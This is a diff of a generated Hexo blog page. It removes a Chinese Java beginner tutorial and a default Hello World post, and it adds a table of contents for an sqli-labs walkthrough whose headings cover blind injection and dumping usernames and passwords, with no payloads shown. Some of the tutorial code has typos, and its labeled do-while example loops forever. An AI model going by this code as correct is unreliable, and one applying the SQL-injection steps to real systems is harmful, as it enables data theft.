-<h2 id="运算符与表达式"><a href="#运算符与表达式" class="headerlink" title="运算符与表达式"></a>运算符与表达式</h2><p><img src="https://tse3-mm.cn.bing.net/th/id/OIP-C.Pcjbea0A02bM7L2H4MgRXQHaES?pid=ImgDet&rs=1"></p>
-<ol>
-<li>算术运算符</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test003</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        System.out.println(<span class="number">0</span>/i);    <span class="comment">//0</span></span><br><span class="line">        System.out.println(<span class="number">0</span>%i);    <span class="comment">//0</span></span><br><span class="line">        System.out.println(i/<span class="number">0</span>);    <span class="comment">//除数不能为零，报异常java.lang.ArithmeticException</span></span><br><span class="line">        System.out.println(i%<span class="number">0</span>);    <span class="comment">//除数不能为零，报异常java.lang.ArithmeticException</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dema06</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">123123123123123L</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line">        <span class="type">short</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">        System.out.println(a+b+c+d);  <span class="comment">//123123123123264</span></span><br><span class="line">        System.out.println(b+c+d);  <span class="comment">//141</span></span><br><span class="line">        System.out.println(c+d);   <span class="comment">//18</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有long为long，没有为int</span></span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><p>赋值运算符<br><code>+= -= *= /= %=</code></p>
-</li>
-<li><p>自增自减运算符<br><code>++ --</code></p>
-</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">        System.out.println(i++);    <span class="comment">//5</span></span><br><span class="line">        System.out.println(++i);    <span class="comment">//7</span></span><br><span class="line">        System.out.println(i);    <span class="comment">//7</span></span><br><span class="line">        System.out.println(--i);    <span class="comment">//6</span></span><br><span class="line">        System.out.println(i--);    <span class="comment">//6</span></span><br><span class="line">        System.out.println(i);    <span class="comment">//5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li><p>关系运算符<br><img src="https://tse1-mm.cn.bing.net/th/id/OIP-C.9KJRz37vTTTKMDTHxqObMQHaEC?pid=ImgDet&rs=1"></p>
-</li>
-<li><p>逻辑运算符</p>
-</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Doem05</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">t</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        System.out.println(t &amp;&amp; f);      <span class="comment">//false，短路与运算符，若运算符左侧为false则不计算右侧的表达式</span></span><br><span class="line">        System.out.println(t || f);      <span class="comment">//true，短路或运算符，若运算符左侧为true则不计算右侧的表达式</span></span><br><span class="line">        System.out.println(t &amp; f);       <span class="comment">//false，与运算符，不管左侧是否为false都要计算右侧的表达式</span></span><br><span class="line">        System.out.println(t | f);       <span class="comment">//true，或运算符，不管左侧是否为true都要计算右侧的表达式</span></span><br><span class="line">        System.out.println(t ^ f);       <span class="comment">//true，异或运算符，只要左右两侧不相同则为true，反之为false</span></span><br><span class="line">        System.out.println(!f);          <span class="comment">//true，取反运算符</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>位运算符</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo06</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//在位运算符中1相当于true，0相当于false</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="number">6</span>;    <span class="comment">//二进制为00000000 00000000 00000000 00000110</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="number">11</span>;    <span class="comment">//二进制为00000000 00000000 00000000 00001011</span></span><br><span class="line">        System.out.println(b1 &amp; b2);    <span class="comment">//按位与运算符，都是1为1，二进制为00000000 00000000 00000000 00000010，结果为2</span></span><br><span class="line">        System.out.println(b1 | b2);    <span class="comment">//按位或运算符，有1为1，二进制为00000000 00000000 00000000 00001111，结果为15</span></span><br><span class="line">        System.out.println(b1 ^ b2);    <span class="comment">//按位异或运算符，相同为0，不同为1，二进制为00000000 00000000 00000000 00001101，结果为13</span></span><br><span class="line">        System.out.println(~b1);    <span class="comment">//按位取反运算符，二进制为11111111 11111111 11111111 11111001，结果为-7</span></span><br><span class="line">        System.out.println(b1 &lt;&lt; <span class="number">2</span>);    <span class="comment">//左移位运算符，二进制为00000000 00000000 00000000 00011000，结果为24</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b3</span> <span class="operator">=</span> -<span class="number">14</span>;    <span class="comment">//二进制为11111111 11111111 11111111 11110010</span></span><br><span class="line">        System.out.println(b3 &gt;&gt; <span class="number">2</span>);    <span class="comment">//带符号右移位运算符，二进制为11111111 11111111 11111111 11111100，结果为-4</span></span><br><span class="line">        System.out.println(b3 &gt;&gt;&gt; <span class="number">2</span>);    <span class="comment">//无符号右移位运算符，二进制为00111111 11111111 11111111 11111100，结果为1073741820</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="7">
-<li>三元运算符</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> c == a + b? ++a:c&gt;a+b?++b:++c;       <span class="comment">//三元运算符 (表达式)?(值1):(值2)，若表达式为true则取值1，反之取值2</span></span><br><span class="line">        System.out.println(res);  <span class="comment">//++b,结果为3</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="8">
-<li>运算符优先级</li>
-</ol>
-<h2 id="包机制"><a href="#包机制" class="headerlink" title="包机制"></a>包机制</h2><p>package</p>
-<p>(导入包)</p>
-<p>import </p>
-<h2 id="javaDoc"><a href="#javaDoc" class="headerlink" title="javaDoc"></a>javaDoc</h2><p>javaDoc命令是用来生成自己API文档的</p>
-<p>帮助文档</p>
-<p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/api/">Overview (Java Platform SE 8 ) (oracle.com)</a></p>
-<p>参数信息</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@auther</span> 作者名</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@version</span> 版本号</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@since</span> 指明需要最早使用的jdk版本</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@param</span> 参数名</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@return</span> 返回值情况</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@throws</span> 异常值抛出情况</span></span><br><span class="line"><span class="comment">         */</span></span><br></pre></td></tr></table></figure>
-
-
-
-<ol>
-<li><strong>通过命令行生成</strong></li>
-</ol>
-<p>生成javadoc，在doc.java路径下打开cmd</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javadoc -encoding UTF-<span class="number">8</span> -charset UTF-<span class="number">8</span> [文件名]</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>通过IDEA生成</li>
-</ol>
-<p>工具栏打开tools，点击Generate JavaDoc</p>
-<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230728231255141.png?raw=true"></p>
-<p><img src="https://github.com/QGTSL/QGTSL.github.io/blob/main/images/image-20230728231923042.png?raw=true"></p>
-<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ol>
-<li>一维数组</li>
-<li>二维数组</li>
-</ol>
-<h2 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h2><ol>
-<li>条件分支语句</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test003</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] score = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">5</span>];</span><br><span class="line">        score[<span class="number">0</span>] = -<span class="number">7</span>;</span><br><span class="line">        score[<span class="number">1</span>] = <span class="number">65</span>;</span><br><span class="line">        score[<span class="number">2</span>] = <span class="number">80</span>;</span><br><span class="line">        score[<span class="number">3</span>] = <span class="number">90</span>;</span><br><span class="line">        score[<span class="number">4</span>] = <span class="number">59</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;score.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(score[i]&gt;=<span class="number">0</span> &amp;&amp; score[i]&lt;<span class="number">60</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(score[i]&gt;=<span class="number">60</span> &amp;&amp; score[i]&lt;<span class="number">80</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(score[i]&gt;=<span class="number">80</span> &amp;&amp; score[i]&lt;<span class="number">90</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;良&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(score[i]&gt;=<span class="number">90</span> &amp;&amp; score[i]&lt;<span class="number">100</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;优&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;成绩异常&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">switch</span>(ch) &#123;    <span class="comment">//switch括号内只支持 byte,short,int,char,enum五种数据类型，但是JDK1.7版本增加了String类型，所以相对于JDK1.7而言就是六种了</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:    <span class="comment">//case为switch语句的入口，break为出口，从入口开始执行，直到遇到出口或代码执行完毕才结束</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;优&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;良&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:    <span class="comment">//若上述条件均不匹配，则进default开始执行语句</span></span><br><span class="line">                System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<ol start="2">
-<li>循环语句</li>
-</ol>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test003</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        out:    <span class="comment">//out是一个标号，告诉java从哪里开始执行程序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=<span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">3</span>) <span class="keyword">continue</span> out;    <span class="comment">//continue终止本次循环，执行下次循环</span></span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">5</span>) <span class="keyword">break</span> out;    <span class="comment">//break跳出循环</span></span><br><span class="line">            res = res + i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(res);    <span class="comment">//结果为1+2+4=7</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">res2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        in:</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">3</span>) <span class="keyword">continue</span> in;    <span class="comment">//continue终止本次循环，执行下次循环</span></span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">5</span>) <span class="keyword">break</span> in;    <span class="comment">//break跳出循环</span></span><br><span class="line">            res2 = res2 + i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;<span class="keyword">while</span>(i&lt;=<span class="number">10</span>);</span><br><span class="line">        System.out.println(res2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>Scanner类来获取用户的输入</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.prinln(in.nextline());</span><br></pre></td></tr></table></figure>
-
-
-
-<p>通过<code>Scanner</code>类的<code>next()</code>与<code>nextLine()</code>方法获取输入的字符串，再读取前我们一般需要使用<code>hasNext()</code>与<code>hasNextLine()</code>判断是否还有输入的数据</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/29/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/29/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-07-29 11:15:34" itemprop="dateCreated datePublished" datetime="2023-07-29T11:15:34+08:00">2023-07-29</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -1985,6 +1168,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-lab%E5%85%A8%E9%80%9A%E5%85%B3"><span class="nav-number">1.</span> <span class="nav-text">sql-lab全通关</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">sql注入基本流程：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GET%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.2.</span> <span class="nav-text">GET类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-2"><span class="nav-number">1.2.2.</span> <span class="nav-text">less-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-3"><span class="nav-number">1.2.3.</span> <span class="nav-text">less-3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-4"><span class="nav-number">1.2.4.</span> <span class="nav-text">less-4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-5"><span class="nav-number">1.2.5.</span> <span class="nav-text">less-5</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">手工盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#burpsuite%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">burpsuite的自动化盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B5%8C%E5%A5%97%E6%9F%A5%E8%AF%A2"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">嵌套查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml%E5%87%BD%E6%95%B0"><span class="nav-number">1.2.5.4.</span> <span class="nav-text">updatexml函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-6"><span class="nav-number">1.2.6.</span> <span class="nav-text">less-6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-7"><span class="nav-number">1.2.7.</span> <span class="nav-text">less-7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-8"><span class="nav-number">1.2.8.</span> <span class="nav-text">less-8</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="nav-number">1.2.8.1.</span> <span class="nav-text">原理：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.2.8.2.</span> <span class="nav-text">猜解数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D"><span class="nav-number">1.2.8.3.</span> <span class="nav-text">猜解表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E8%A7%A3%E5%AD%97%E6%AE%B5"><span class="nav-number">1.2.8.4.</span> <span class="nav-text">猜解字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8C%9C%E5%86%85%E5%AE%B9"><span class="nav-number">1.2.8.5.</span> <span class="nav-text">猜内容</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-9"><span class="nav-number">1.2.9.</span> <span class="nav-text">less-9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-10"><span class="nav-number">1.2.10.</span> <span class="nav-text">less-10</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.3.</span> <span class="nav-text">POST类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#less-11"><span class="nav-number">1.3.1.</span> <span class="nav-text">less-11</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%BE%E7%A4%BA%E4%BD%8D"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">判断显示位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">爆数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E8%A1%A8"><span class="nav-number">1.3.1.4.</span> <span class="nav-text">爆数据表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86user%E8%A1%A8%E7%9A%84%E5%88%97"><span class="nav-number">1.3.1.5.</span> <span class="nav-text">爆user表的列</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81"><span class="nav-number">1.3.1.6.</span> <span class="nav-text">爆破用户名和密码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-12"><span class="nav-number">1.3.2.</span> <span class="nav-text">less-12</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#less-13"><span class="nav-number">1.3.3.</span> <span 